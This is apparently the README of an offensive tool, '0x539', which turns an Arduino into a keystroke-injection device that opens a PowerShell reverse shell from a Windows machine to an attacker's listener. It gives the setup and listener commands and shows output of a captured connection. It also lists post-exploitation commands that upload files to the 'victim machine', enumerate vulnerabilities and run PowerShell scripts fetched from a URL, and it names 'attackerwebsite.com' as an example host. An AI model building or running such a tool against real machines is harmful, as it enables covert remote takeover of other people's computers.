# 0x539 Tool

This project is to connect a windows maching using an arduino to a listening server using a port and a host through TCP.
 
*Note: A video tutorial will be added on the main* [Lear Hacking](https://www.youtube.com/channel/UCGj2tNcFld-_tCZLSkFe4ww) *Youtube channel soon!*

## Getting Started

Once the Arduino is plugged to the windows machine you'll have a powershell of that user.

### Prerequisites

To complete this you will first need to install the [Aduino IDE](https://www.arduino.cc/en/main/software), and a list of python packages.


```
pwn, argparse
```

### Installing

* Install the Arduino IDE.
* Install python on Linux:
```
sudo apt update
sudo apt-get install python3.8
```
* Install pwn

```
pip install pwn
# or
python3 pip install pwn
```

## Running the tool

After cloning this repository into your linux machine.

### Run the script listener

To see the help menu of the tool listener:

```
python3 listen-usb.py -h
```
```
usage: listen-usb.py [-h] [-debug] --lport LPORT --lhost LHOST --keyboard
                     KEYBOARD

0x539 tool. A tool to connect to thepowershell reversed shell from arduino mini
pro.

optional arguments:
  -h, --help           show this help message and exit
  -debug               debug mode will keep the cmd window open"
  --lport LPORT        port example: 4444
  --lhost LHOST        host example: attackerwebsite.com (or an ip
                       198.23.44.132)
  --keyboard KEYBOARD  keyboard example: azerty (or qwerty)
```


### Example:

Running this next command will generate an Arduino C code, which is the exploit that gonna be uploaded to the Arduino (Im using Arduino pro mini atmega32u4).

```
python3 listen-usb.py --lport 9001 --lhost 192.168.183.20 --keyboard qwerty
```
This will keep listening on the specified port and generate a new file called arduino_qwerty.c .
```
# fist terminal
kali@kali:~/Documents/tools/github-proj/usb-reverse$ python3 listen-usb.py --lport 9001 --lhost 192.168.183.20 --keyboard qwerty
[+] Creating file: arduino_qwerty.c
[+] File created check it on the current path
[+] Listening..
[+] Trying to bind to 0.0.0.0 on port 9001: Done
[┐] Waiting for connections on 0.0.0.0:9001

```
```
# second terminal
kali@kali:~/Documents/tools/github-proj/usb-reverse$ ls
arduino_qwerty.c  exploits  listen-usb.py  README.md
```
Next thing to do is compile the Arduino c file in the Arduino IDE mentioned earlier, im not gonna go through that cause there's a plenty of tutorials out there to compile an Arduino c code and upload, so just google that, or check this videos playlist [Arduino Workshop - Chapter One - Hello World Example](https://www.youtube.com/watch?v=Bz_s3D96C5c&list=PLPK2l9Knytg5s2dk8V09thBmNl2g5pRSr&index=8).

Now once you plug in the Arduino on the usb port, you will be connected to the tool

```
kali@kali:~/Documents/tools/github-proj/usb-reverse$ python3 listen-usb.py --lport 9003 --lhost 192.168.183.20 --keyboard qwerty
[+] Creating file: arduino_qwerty.c
[+] File created check it on the current path
[+] Listening..
[+] Trying to bind to 0.0.0.0 on port 9003: Done
[+] Waiting for connections on 0.0.0.0:9003: Got connection from 192.168.183.1 on port 58629

      ___   ___   ___  _____   ____     ___
     / _ \  \  \ /  / | ____| |___ \   / _ \
    | | | |  \  V  /  | |__     __) | | (_) |
    | | | |   >   <   |___ \   |__ <   \__, |
    | |_| |  /  .  \   ___) |  ___) |    / /
     \___/  /__/ \__\ |____/  |____/    /_/

     Tool.

!0x53O>
```

Now that you're connected to the tool, you can interact with the powershell and use the tool commands.

## Tool brief

Type help to get the help menu

```

commands:
    ps              connect to powershell
    upload          download file
    enumerate       enumerate windows vulnerabilities
    urlexec         execute a powershell script from a link
    help            open this help menu
    exit            quit this tool
```

### ps command
Gives you a prompt to powershell on that windows.

### upload command
Uploads a file to the victim machine.
```
usuage:
	upload <link> <filename>
example:
	uplaod https://raw.githubusercontent.com/absolomb/WindowsEnum/master/WindowsEnum.ps1 windowsEnum.ps1
```
### enumerate command
Enumerate the windows privileges and informations.

### urlexec
Execute a powershell script from a url

## Creator

* This tool was Created by [l0x539](https://0x539.co).

